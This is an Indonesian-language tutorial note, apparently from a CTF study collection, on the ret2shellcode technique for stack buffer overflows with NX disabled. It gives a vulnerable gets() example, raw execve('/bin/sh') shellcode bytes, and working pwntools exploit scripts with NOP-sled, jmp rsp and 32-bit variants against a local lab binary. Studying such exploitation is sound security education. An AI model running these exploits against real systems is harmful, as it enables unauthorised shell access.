#cybersecurity

Ret2shellcode dipakai saat **NX off** (atau ada region executable yang bisa kita isi): kita menaruh **shellcode** di buffer, lalu melompat ke sana.

## Skenario

```c
void vuln() {
    char buf[128];
    gets(buf);
}
```

Dengan proteksi:

```bash
checksec --file=chall
# NX disabled  <- stack executable
# PIE disabled
```

## Langkah

1. Cari alamat buffer (biasanya di-print program, atau dari gdb)
2. Susun: `[shellcode][padding][alamat buffer]`
3. Kirim

## Shellcode

Pakai pwntools:

```python
from pwn import *

context.arch = "amd64"
shellcode = asm(shellcraft.sh())   # execve("/bin/sh", 0, 0)
```

Hasilnya sekitar 30 byte:

```text
\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05
```

## Exploit

```python
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF("./chall")
io = process("./chall")

buf_addr = 0x7ffffffde000   # alamat buffer (dari leak / gdb)
offset = 136                 # dari cyclic_find

shellcode = asm(shellcraft.sh())

payload = shellcode
payload += b"A" * (offset - len(shellcode))   # pad sampai return address
payload += p64(buf_addr)                       # lompat ke awal buffer

io.sendline(payload)
io.interactive()
```

## Kalau buffer kecil / tidak tahu alamat persis

### NOP sled

Tambahkan NOP sled (`\x90`) supaya lompatan tidak harus tepat:

```python
payload = b"\x90" * 64 + shellcode + b"A"*(offset-64-len(shellcode)) + p64(buf_addr + 32)
```

Lompat ke tengah NOP sled - CPU meluncur ke shellcode.

### JMP RSP

Gadget `jmp rsp` membuat kita tidak perlu tahu alamat buffer: saat `ret`, RSP menunjuk tepat setelah return address - tempat kita taruh shellcode:

```python
jmp_rsp = 0x401012  # dari ROPgadget

payload = b"A"*offset + p64(jmp_rsp) + shellcode
```

## 32-bit

```python
context.arch = "i386"
payload = shellcode + b"A"*(offset-len(shellcode)) + p32(buf_addr)
```

## Catatan

1. NX **harus off** (atau ada segmen executable lain, misal `.text` dengan buffer global).
2. Alamat stack acak karena ASLR - butuh **leak alamat buffer** (program print `%p`/alamat, atau brute force alamat stack).
3. `gets` berhenti di newline - shellcode tidak boleh mengandung `\x0a`. Kalau ada, sesuaikan atau pakai input `read`.
4. `shellcraft.sh()` menghasilkan execve("/bin/sh") - cek dengan `print(disasm(shellcode))`.
5. Kalau NX on, pakai [[Ret2libc]] / ROP.
